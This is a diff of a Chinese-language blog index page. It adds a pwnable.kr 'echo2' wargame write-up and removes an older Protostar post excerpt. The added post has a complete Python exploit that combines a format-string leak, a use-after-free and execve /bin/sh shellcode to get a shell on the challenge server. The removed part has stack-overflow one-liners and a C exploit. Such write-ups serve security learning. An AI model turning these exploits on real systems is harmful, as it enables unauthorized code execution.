@@ -298,6 +298,139 @@
             
               
                 
+                <a class="post-title-link" href="/2016/07/25/pwnable-rookiss-echo2/" itemprop="url">
+                  pwnable.kr-rookiss-echo2
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-25T00:00:00+08:00" content="2016-07-25">
+              2016-07-25
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/25/pwnable-rookiss-echo2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/25/pwnable-rookiss-echo2/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Trick">Trick</h2><p>对于x64<strong>fsb</strong></p>
+<ul>
+<li><code>%1$lx</code>: RSI</li>
+<li><code>%2$lx</code>: RDX</li>
+<li><code>%3$lx</code>: RCX</li>
+<li><code>%4$lx</code>: R8</li>
+<li><code>%5$lx</code>: R9</li>
+<li><code>%6$lx</code>: 栈上的第一个QWORD</li>
+</ul>
+<h2 id="Conclusion">Conclusion</h2><p>虽然这题看起来很常规，既有fsb也有uaf，但是我的思路又错了QAQ，刚开始没有想到注意到这题也是没有开NX的，思路就歪了，看到fsb首先做的是泄露libc地址，然后想通过uaf实现ret2libc，但是这里似乎故意对<code>echo3</code>中的字符串长度做了限制，导致<code>o+4*8</code>不能被覆盖到，如果是覆盖<code>o+3*8</code>为<code>system</code>地址的话，然后试图在<code>o</code>中写入字符串<code>/bin/sh\x00</code>，会发现<code>o</code>在被free后fd指针会被覆盖，导致写好的<code>/bin/sh\x00</code>字符串被破坏，这种方法我想了很久没有想出来</p>
+<p>后来又是google一些做法，才想到利用<code>uaf</code>jump到栈上存放shellcode的name数组上，而shellcode的地址，可以利用<code>fsb</code>来泄露<code>$rbp</code>的值而得到，还是too naive</p>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">## Exploit</span></span><br><span class="line">​```python</span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./echo2'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9011</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io.gdb_hint([0x400864, 0x400886])</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x400887])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.exploit-db.com/exploits/36858/</span></span><br><span class="line">shellcode = <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"</span><span class="string">"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"hey, what's your name? :"</span>)</span><br><span class="line">io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fsb</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.readline()</span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uaf</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.readline()</span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">freeo</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Are you sure you want to exit? (y/n)'</span>)</span><br><span class="line">    io.writeline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">payload0    =   <span class="string">"%10$016lx"</span></span><br><span class="line">fsb(payload0)</span><br><span class="line"></span><br><span class="line">adr_sc      =   int((io.read(<span class="number">16</span>)), <span class="number">16</span>) - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">freeo()</span><br><span class="line">payload1    =   <span class="string">''</span>.ljust(<span class="number">0x18</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1    +=  l64(adr_sc)</span><br><span class="line">uaf(payload1)</span><br><span class="line">io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">io.writeline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h2 id="Reference">Reference</h2><p><a href="https://gist.github.com/ihciah/46a389321db5ab04f31b" target="_blank" rel="external">https://gist.github.com/ihciah/46a389321db5ab04f31b</a></p>
+<p><a href="http://blog.yiz96.com/archives/120" target="_blank" rel="external">http://blog.yiz96.com/archives/120</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/07/24/pwnable-rookiss-brainfuck/" itemprop="url">
                   pwnable.kr-rookiss-bf
                 </a>
@@ -784,136 +917,11 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/20/protostar/" itemprop="url">
-                  protostar
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-20T00:00:00+08:00" content="2016-07-20">
-              2016-07-20
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/20/protostar/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/20/protostar/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="stack_0">stack 0</h2><p><code>python -c &quot;print &#39;A&#39;*65&quot; | ./stack0</code></p>
-<h2 id="stack_1">stack 1</h2><p><code>./stack1 $(python -c &quot;print &#39;dcba&#39;*17&quot;)</code></p>
-<h2 id="stack_2">stack 2</h2><h3 id="Exploit">Exploit</h3><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, const char <span class="variable">*argv</span>[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i               = <span class="number">0</span>;</span><br><span class="line">    char <span class="variable">*my_argv</span>[<span class="number">1</span>]    = &#123;NULL&#125;;</span><br><span class="line">    char <span class="variable">*my_env</span>[<span class="number">2</span>]     = &#123;NULL&#125;;</span><br><span class="line">    char <span class="keyword">env</span>[<span class="number">76</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">env</span>[<span class="number">0</span>] = <span class="string">'G'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">1</span>] = <span class="string">'R'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">2</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">3</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">4</span>] = <span class="string">'N'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">5</span>] = <span class="string">'I'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">6</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">7</span>] = <span class="string">'='</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">72</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">env</span>[i] = <span class="string">'A'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">72</span>] = <span class="string">'\x0a'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">73</span>] = <span class="string">'\x0d'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">74</span>] = <span class="string">'\x0a'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">75</span>] = <span class="string">'\x0d'</span>;</span><br><span class="line"></span><br><span class="line">    my_env[<span class="number">0</span>] = <span class="keyword">env</span>;</span><br><span class="line">    my_env[<span class="number">1</span>] = NULL;</span><br><span class="line">    </span><br><span class="line">    execve(<span class="string">"./stack2"</span>, my_argv, my_env);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="stack_3">stack 3</h2><p><code>python -c &quot;print &#39;A&#39;*64+&#39;\x24\x84\x04\x08&#39;&quot; | ./stack3</code></p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/07/20/protostar/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -954,7 +962,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">30</span>
+              <span class="site-state-item-count">31</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -971,7 +979,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">34</span>
+                <span class="site-state-item-count">35</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
